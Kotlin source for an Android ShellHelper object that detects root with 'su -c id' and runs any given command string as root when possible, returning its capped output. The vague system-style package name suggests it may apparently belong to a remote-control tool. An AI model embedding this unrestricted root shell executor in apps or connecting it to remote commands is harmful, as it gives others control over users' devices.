package com.sys.svc.helpers

import com.sys.svc.Logger
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit

object ShellHelper {

    fun isRooted(): Boolean = try {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
        p.waitFor(2, TimeUnit.SECONDS) && p.exitValue() == 0
    } catch (_: Exception) { false }

    fun exec(cmd: String): String {
        if (cmd.isBlank()) return "❌ خالی"
        return try {
            val (proc, prefix) = if (isRooted())
                Runtime.getRuntime().exec(arrayOf("su", "-c", cmd)) to ""
            else
                Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd)) to "(sandbox) "
            val out = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            val err = BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
            proc.waitFor(30, TimeUnit.SECONDS)
            val result = (out + err).trim().ifEmpty { "(no output)" }
            prefix + result.take(3200)
        } catch (e: Exception) {
            Logger.e("Shell", "", e)
            "❌ ${e.message}"
        }
    }
}